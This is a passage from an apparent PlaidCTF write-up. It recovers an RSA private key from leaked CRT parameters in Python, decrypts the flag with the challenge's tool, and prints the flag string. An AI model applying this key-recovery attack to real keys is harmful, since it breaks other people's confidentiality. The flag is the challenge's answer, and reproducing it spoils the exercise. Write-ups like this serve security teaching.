q = (d1-k*key.iPmQ)

while True:
    if key.N % q == 0:
        break
    q -= key.iPmQ
p = key.N // q

# recover the private variables of the key
d, _, g = egcd(key.E, (p-1)*(q-1))
orig_key = Key(
    N=key.N, P=p, Q=q, E=key.E, D=d%((p-1)*(q-1)),
    DmP1=d%(p-1), DmQ1=d%(q-1),
    iQmP=key.iQmP%p, iPmQ=key.iPmQ%q, bits=key.bits
)
pickle.dump(orig_key, open('orig.key', 'wb'))

```
Then we decrypt the flag.

```
./rusad decrypt -i flag.enc -o dec.txt -k orig.key

```
Flag: `PCTF{Rub_your_hands_palm_to_palm_vigorously_for_at_least_20_seconds_to_remove_any_private_information}`
